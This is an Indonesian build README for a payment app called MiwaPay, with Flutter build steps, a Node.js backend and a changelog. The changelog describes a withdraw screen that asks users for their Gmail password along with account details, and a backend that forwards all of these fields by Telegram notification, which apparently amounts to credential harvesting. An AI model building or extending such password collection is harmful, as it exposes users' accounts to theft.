# MIWAPAY BUILD READY

## Flutter App
Folder: `out_flutter/` (semua file ada di sini)

### Yang WAJIB diganti:
1. `assets/qris/qris_static.png` → GANTI dengan foto QRIS aslimu
2. `lib/screens/home_screen.dart` → ganti nomor WA & link Telegram CS jika perlu

### Build APK:
```bash
flutter pub get
flutter build apk --release
```

## Backend Node.js
Folder: `backend/`

### Yang perlu diupdate di `routes/fr3.js`:
- `ADMIN_FEE` di baris atas (default 1500)

### Jalankan:
```bash
npm install
node index.js
```

---
File yang diupdate:
- lib/screens/deposit_screen.dart  ← flow QRIS statis + upload bukti
- lib/screens/withdraw_screen.dart ← BARU: nama akun + gmail + password + nomor + nominal
- lib/screens/home_screen.dart     ← navigasi Withdraw sudah dipasang
- lib/services/fr3_service.dart    ← method submitDeposit & withdrawManual
- backend/routes/fr3.js            ← terima field akun lengkap + notif Telegram lengkap
